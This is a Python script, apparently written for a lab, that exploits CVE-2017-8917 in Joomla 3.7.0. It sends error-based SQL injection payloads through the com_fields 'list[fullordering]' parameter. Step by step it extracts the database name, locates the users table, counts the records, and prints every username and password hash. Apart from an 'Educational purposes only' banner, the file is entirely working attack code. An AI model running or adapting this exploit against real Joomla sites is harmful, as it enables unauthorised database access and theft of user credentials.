#!/usr/bin/python

# # # # # # ERROR-BASED SQL INJECTION # # # # # # 
# Exploit for Joomla 3.7.0 - AkuCyberSec	#
# CVE-2017-8917					#
# # # # # # # # # # # # # # # # # # # # # # # # # 
# 	Educational purposes only 		#
#						#
#						#
#						#
# # # # # # # # # # # # # # # # # # # # # # # # # 

import requests
import re # Regular Expressions

baseUrl = 'http://192.168.56.103' # Target URL
vulnerablePage = '/joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=' # Vulnerable Page

# At first I thought cookies were necessary because every test was failing.
# It turned out they are not.
session = requests.Session()
cookies = None
def SetCookies():
	response = session.get(baseUrl)
	cookies = response.cookies.get_dict() # { 'cookie1' : 'val1' }

# Converts a string to an hex string (AAA => 0x414141)
# This method allows us to avoid the using of quotes
# e.g. 
# SELECT * FROM table WHERE column = 0x414141 instead of
# SELECT * FROM table WHERE column = 'AAA'
def ConvertToHexString(value):
	response = '0x'
	for char in value:
		response += hex(ord(char))[2:]
	return response

# Creates MySQL Error Payload
# Delimiters are used to retrieve the value using regular expressions
# The parameter selectField is the query that returns 1 single element that we want to retrieve (e.g. username)
def CreateMySQLErrorPayload(delimiter, selectField):
	# delimiter (e.g. CHAR(126,126,126))
	# selectField (e.g. DATABASE())
	return '(SELECT 1 FROM (SELECT COUNT(*), CONCAT(' + ConvertToHexString(delimiter) +',' + selectField + ',' + ConvertToHexString(delimiter) + ',FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)A GROUP BY x)B)'

# Sends the request using the payload
# then returns the value in between the delimiters
def SendRequest(payload, delimiter):
	url = baseUrl + vulnerablePage + payload
	response = session.get(url, cookies = cookies)
	regexp = re.compile(delimiter + '(.+)' + delimiter)
	search = regexp.search(response.text)
	return search.group(1)


def GetDatabaseName():
	delimiter = chr(126) + chr(126) + chr(126)
	payload = CreateMySQLErrorPayload(delimiter, 'DATABASE()')
	return SendRequest(payload, delimiter)

def GetTableName(dbName):
	tableName = ConvertToHexString('%_users')
	delimiter = chr(126) + chr(126) + chr(126)
	payload = CreateMySQLErrorPayload(delimiter, '(SELECT CONCAT(SUBSTRING(TABLE_NAME,1,1),CHAR(125,125),SUBSTRING(TABLE_NAME, 2, LENGTH(TABLE_NAME) -1)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE ' + tableName +' AND TABLE_SCHEMA = ' + ConvertToHexString(dbName) +')')
	result = SendRequest(payload, delimiter).replace(chr(125), '')
	return result

def GetNumberOfRecords(tableName):
	delimiter = chr(126) + chr(126) + chr(126)
	payload = CreateMySQLErrorPayload(delimiter, '(SELECT COUNT(*) FROM ' + tableName + ')')
	return SendRequest(payload, delimiter)

def GetUsers(tableName, numOfRecords):
	delimiter = chr(126)
	for i in range(int(numOfRecords)):
		payloadUser = CreateMySQLErrorPayload(delimiter, '(SELECT Username FROM ' + tableName + ' LIMIT 1 OFFSET ' + str(i) +')')
		payloadPass = CreateMySQLErrorPayload(delimiter, '(SELECT Password FROM ' + tableName + ' LIMIT 1 OFFSET ' + str(i) +')')
		print ('User: ' + SendRequest(payloadUser, delimiter) + ':' + SendRequest(payloadPass, delimiter))

SetCookies()

dbName = GetDatabaseName()
print('Database name: ' + dbName)

tableName = GetTableName(dbName)
print('Table name: ' + tableName)

numOfRecords = GetNumberOfRecords(tableName)
print('Users: ' + numOfRecords)

GetUsers(tableName, numOfRecords)
